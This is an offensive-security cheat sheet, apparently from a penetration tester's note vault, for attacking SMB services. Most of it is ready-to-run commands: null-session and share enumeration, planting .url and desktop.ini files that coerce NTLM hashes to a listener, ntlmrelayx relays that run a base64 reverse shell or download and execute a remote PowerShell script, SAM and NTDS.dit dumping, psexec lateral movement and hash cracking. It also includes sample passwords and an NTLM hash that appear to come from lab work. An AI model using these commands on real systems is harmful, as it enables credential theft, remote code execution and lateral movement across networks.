# SMB

## Overview

Core SMB page for share enumeration, null/guest access, credentialed enumeration, relay-related checks, and remote execution primitives.

## Default Ports

- 445/tcp SMB, 139/tcp legacy NetBIOS session service


## Tooling Note

- `nxc` / NetExec examples are preferred where present.
- Some legacy `crackmapexec` command lines were intentionally retained for searchability because the source vault used them heavily and operators still encounter them in older notes and scripts.

## Quick Enumeration

```
# Connect to a specific SMB share
smbclient //<FQDN IP>/<share>

# Interaction with the target using RPC
rpcclient -U "" <FQDN IP>

# Enumerating SMB shares using null session authentication.
crackmapexec smb <FQDN/IP> --shares -u '' -p '' --shares

# put InternetShortcut 'exploit.url' ------------ THIS ONE WORKS
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\192.168.45.165\%USERNAME%.icon
IconIndex=1
```

*MAY WORK, MAY NOT* We can retrieve the hashes by putting **`desktop.ini`** file, that contains arbitrary icon resource path, to the shared folder.
Create a new **`desktop.ini`** in local machine.

```txt
[.ShellClassInfo]
IconResource=\\<local-ip>\test
```

Then upload it to the writable shared folder.

```bash
smb> put desktop.ini
```

Start responder in local machine.

```bash
responder -I tun0
```

After a while, we can retrieve the NTLM hashes.

---

## Attacking SMB

```
# Network share enumeration using smbmap.
smbmap -H 10.129.14.128

# Null-session with the rpcclient.
rpcclient -U'%' 10.10.110.17

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Extract hashes from the SAM database.
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

# Dump the SAM database using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64_reverse_shell>'
```

## SMB NULL SESSION?  (→ smb_null.txt)

```bash
for ip in $(cat online); do smbclient -L "//$ip/" -N -g >/dev/null 2>&1 && echo $ip; done | tee smb_null.txt
```

## RPC NULL INFO?  (→ rpc_null.txt)

```bash
for ip in $(cat online); do rpcclient -U "" -N "$ip" -c info 2>&1 | grep -q 'Domain' && echo $ip; done | tee rpc_null.txt
```

## NETEXEC SMB SHARE ENUM?  (→ ne_smb.txt)

```bash
netexec smb online -u '' -p '' --shares | tee ne_smb.txt
```

## NETEXEC SMB GUEST ENUM? (→ ne_smb_guest.txt)

```bash
netexec smb online -u "guest" -p "" --shares |tee ne_smb_guest.txt
```

## SMB PSEXEC?

```bash
psexec.py <dom>/<user>:<pass>@<host>
```

############################################

## impacket-smbclient

```
impacket-smbclient <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```
```
export KRB5CCNAME=<USERNAME>.ccache
impacket-smbclient -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass
```

## impacket-smbpasswd

```
impacket-smbpasswd <RHOST>/<USERNAME>:<PASSWORD>@<RHOST> -newpass <PASSWORD>
```

## SMB

```bash
nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254
sudo nbtscan -r 192.168.50.0/24
nmap -v -p 139,445 --script smb-os-discovery <target>
```

> **Caution:** The `smb-os-discovery` script only works reliably if SMBv1 is enabled, which is uncommon due to security vulnerabilities.

```bash
ls -1 /usr/share/nmap/scripts/smb*
enum4linux <IP>
smbclient -L //<target>/

smbclient \\\\172.16.169.21\\monitoring -U relia.com\\mountuser --password='DRtajyCwcbWvH/9'

```

**From Windows:**

```bash
net view \\dc01 /all
```

## Hashcat NetNTLMv2 (e.g. SMB Auth)

```
hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt --force
```

## ntlmrelayx SMB Command

```
impacket-ntlmrelayx --no-http-server -smb2support -t smb://<target> -c "powershell.exe iex(iWr -UsEbaSIcparSING http://IP/a.ps1);"
```

---

## Barracuda / Fuguhub

- Version BarracudaDrive v6.5 (now Fuguhub)
	- https://www.exploit-db.com/exploits/48789
	- PrivEsc Exploit confirms what we just found, now get a foothold and then exploit it

---

## check smb not signed

```
nxc smb <IP> --gen-relay-list <output_file>
```

## SMB

💡 Don’t forget to try to check for write permission - for phishing and webshells!
```
smbclient -L 192.168.162.122 -N
```
```
smbclient -L //192.168.195.248/ -U damon -W relia.com
smbclient -L //10.10.1.200/ -U oscp/wade
```
```
smbclient //172.16.229.11/TEMP -U joe -W medtech.com
```
```
crackmapexec smb 192.168.226.172 -u guest -p "" --rid-brute
```
```
enum4linux -a ip
```
```
impacket-smbclient -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.114.140
```
```
smbclient '//192.168.223.240/backup' -N -c 'prompt OFF;recurse ON;mget *'
```
```
timeout 100
get ntds.dit
get SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

## cadaver

```
cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
```
```
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

## Useful Additions

```bash
nxc smb <target> -u '' -p '' --shares
nxc smb <target> -u <user> -p '<password>' --shares --sessions --disks
smbmap -H <target> -u <user> -p '<password>'
```

## Common Attack Paths

- Null session or guest exposure.
- Writable shares that allow shortcut/icon coercion, script placement, backup leakage, or web-root access.
- Relay opportunities when signing is absent or inconsistent.
- Lateral movement via PsExec-style execution, service creation, or remote registry/secrets access.

## See Also

- `03 AD/Domain Enumeration.md`
- `09 Movement/File Transfers.md`
